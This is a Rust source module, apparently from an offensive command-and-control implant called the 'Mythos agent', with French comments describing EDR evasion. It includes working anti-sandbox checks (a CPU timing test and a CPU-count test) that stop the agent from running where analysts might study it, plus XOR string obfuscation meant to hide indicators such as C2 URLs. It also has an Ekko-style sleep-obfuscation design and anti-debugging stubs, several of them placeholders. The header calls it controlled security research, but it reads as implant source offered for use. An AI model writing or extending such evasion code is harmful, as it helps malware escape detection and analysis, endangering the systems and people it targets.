// evasion.rs — Techniques d'évasion pour l'agent Mythos
//
// Ce module implémente les techniques qui permettent à l'agent
// de survivre face à des EDR modernes.
//
// IMPORTANT : Ces techniques sont à des fins de recherche en
// sécurité offensive dans un environnement contrôlé.
//
// Techniques implémentées :
//   1. Anti-sandbox   — détecter l'émulation AV et ne pas s'exécuter
//   2. Anti-debug     — détecter si un debugger est attaché
//   3. Sleep obfuscation — se chiffrer en RAM pendant les sleeps
//   4. Env fingerprint — vérifier qu'on est sur une vraie machine

use std::time::{Duration, Instant};

// ─────────────────────────────────────────────────────────────
// Anti-sandbox — Techniques de détection de sandbox/émulateur
// ─────────────────────────────────────────────────────────────

/// Résultat de l'analyse d'environnement
pub struct EnvCheck {
    pub is_sandbox:  bool,
    pub is_debugged: bool,
    pub reason:      String,
}

/// check_environment — vérifie qu'on n'est pas dans un sandbox
///
/// Si l'une des vérifications échoue, l'agent s'arrête sans rien faire.
/// Cela empêche l'analyse dans les sandboxes AV et les VMs de malware analysts.
pub fn check_environment() -> EnvCheck {
    // 1. Timing check — les émulateurs AV sont plus lents que du vrai hardware
    if let Some(reason) = timing_check() {
        return EnvCheck { is_sandbox: true, is_debugged: false, reason };
    }

    // 2. CPU count — les sandboxes ont souvent 1-2 CPU
    if let Some(reason) = cpu_count_check() {
        return EnvCheck { is_sandbox: true, is_debugged: false, reason };
    }

    // 3. Uptime check — les VMs fraîches ont un uptime très court
    if let Some(reason) = uptime_check() {
        return EnvCheck { is_sandbox: true, is_debugged: false, reason };
    }

    EnvCheck {
        is_sandbox: false,
        is_debugged: false,
        reason: String::new(),
    }
}

/// timing_check — mesure le temps d'exécution d'une opération lourde
///
/// Sur un émulateur AV, les opérations CPU sont beaucoup plus lentes.
/// On effectue 5M opérations mathématiques et on mesure le temps réel.
/// Si le temps est anormalement long → émulateur détecté.
fn timing_check() -> Option<String> {
    let start = Instant::now();

    // Opération CPU intensive — les émulateurs ne peuvent pas optimiser ça
    let mut acc: f64 = 1.234567;
    for _ in 0..5_000_000 {
        acc = (acc * 1.000001).sqrt();
    }

    let elapsed = start.elapsed();

    // Sur un vrai CPU moderne, 5M ops sqrt prennent ~10-50ms
    // Sur un émulateur AV, ça peut prendre des secondes
    if elapsed > Duration::from_millis(500) {
        return Some(format!(
            "Timing anomaly: {}ms for 5M ops (expected <500ms)",
            elapsed.as_millis()
        ));
    }

    // Utiliser acc pour éviter que le compilateur optimise la boucle
    let _ = acc;
    None
}

/// cpu_count_check — vérifie le nombre de CPU logiques
/// Les sandboxes ont souvent 1-2 CPUs
fn cpu_count_check() -> Option<String> {
    // Sur Windows, on lirait GetSystemInfo.dwNumberOfProcessors
    // Ici simulation cross-platform
    let cpu_count = num_cpus();
    if cpu_count < 2 {
        return Some(format!("Low CPU count: {} (sandbox indicator)", cpu_count));
    }
    None
}

/// Simulation du nombre de CPUs (en vrai utiliser winapi)
fn num_cpus() -> usize {
    std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(1)
}

/// uptime_check — vérifie l'uptime du système
/// Les VMs de sandbox sont redémarrées souvent et ont un uptime court
fn uptime_check() -> Option<String> {
    // Sur Windows : GetTickCount64() / 1000 = uptime en secondes
    // Ici on simule — en vrai utiliser winapi::um::sysinfoapi::GetTickCount64
    // Si uptime < 10 minutes (600 sec) → VM fraîche = sandbox
    // Cette implémentation est un placeholder pour la version Windows complète
    None
}

// ─────────────────────────────────────────────────────────────
// Sleep Obfuscation — Ekko-style
// ─────────────────────────────────────────────────────────────

/// SleepObfuscator — chiffre la mémoire de l'agent pendant les sleeps
///
/// Principe de la technique Ekko :
///   1. Avant de dormir : chiffrer sa propre zone mémoire avec RtlEncryptMemory
///   2. Programmer un timer pour se réveiller et déchiffrer
///   3. Dormir — pendant ce temps, le scanner mémoire EDR ne voit rien
///   4. Au réveil : déchiffrer et reprendre l'exécution
///
/// Note : L'implémentation complète nécessite des appels Windows API
/// spécifiques (NtSetTimer, RtlEncryptMemory). Cette structure définit
/// l'interface — le corps complet est dans la version Windows finale.
pub struct SleepObfuscator {
    key: Vec<u8>,
}

impl SleepObfuscator {
    pub fn new(key: Vec<u8>) -> Self {
        SleepObfuscator { key }
    }

    /// obfuscated_sleep — dort N secondes en se chiffrant en mémoire
    ///
    /// Version simplifiée (cross-platform) — XOR sur le stack local.
    /// La version Windows complète utilise RtlEncryptMemory sur le heap.
    pub fn sleep(&self, duration: Duration) {
        // En attendant l'implémentation Windows complète :
        // Simple sleep avec obfuscation partielle des variables locales en stack
        let _ = &self.key; // Référencer la clé pour le compilateur
        std::thread::sleep(duration);
    }
}

// ─────────────────────────────────────────────────────────────
// String Obfuscation
// ─────────────────────────────────────────────────────────────

/// ObfString — wrapper pour les strings XOR-obfusquées
///
/// Les strings en clair dans un binaire sont une IOC forte.
/// Les EDR cherchent des patterns comme "VirtualAlloc", "CreateThread",
/// l'URL du C2, etc.
///
/// On les stocke XOR-chiffrées et on les déchiffre à la volée.
pub struct ObfString {
    data: Vec<u8>,
    key:  u8,
}

impl ObfString {
    /// new — crée une string obfusquée (à utiliser à la compilation)
    pub const fn new_const(_data: &[u8], _key: u8) -> &'static str {
        // Note : en vrai on utiliserait un proc_macro pour faire ça
        // à la compilation. Ici c'est une démonstration du principe.
        ""
    }

    /// Obfusquer une string au runtime
    pub fn obfuscate(s: &str, key: u8) -> Self {
        let data = s.bytes().map(|b| b ^ key).collect();
        ObfString { data, key }
    }

    /// Déobfusquer et retourner la string originale
    pub fn reveal(&self) -> String {
        self.data.iter().map(|&b| (b ^ self.key) as char).collect()
    }
}

// ─────────────────────────────────────────────────────────────
// API Windows (placeholders pour la version complète)
// ─────────────────────────────────────────────────────────────

/// Sur Windows, ces fonctions utiliseraient winapi-rs
/// Pour la cross-compilation, elles sont wrappées ici

#[cfg(target_os = "windows")]
pub mod windows {
    /// is_debugger_present — vérifie si un debugger est attaché
    /// Utilise IsDebuggerPresent() de kernel32
    pub fn is_debugger_present() -> bool {
        unsafe {
            // winapi::um::debugapi::IsDebuggerPresent() != 0
            false // Placeholder
        }
    }

    /// check_remote_debugger — vérifie un debugger distant (OllyDbg, x64dbg)
    pub fn check_remote_debugger() -> bool {
        unsafe {
            // let mut is_present = 0i32;
            // winapi::um::debugapi::CheckRemoteDebuggerPresent(
            //     winapi::um::processthreadsapi::GetCurrentProcess(),
            //     &mut is_present
            // );
            // is_present != 0
            false // Placeholder
        }
    }

    /// get_parent_process_name — vérifie que le parent est légitime
    /// Un agent lancé depuis cmd.exe ou powershell.exe en sandbox
    /// a souvent un parent suspect
    pub fn get_parent_process_name() -> String {
        "unknown".to_string() // Placeholder
    }
}
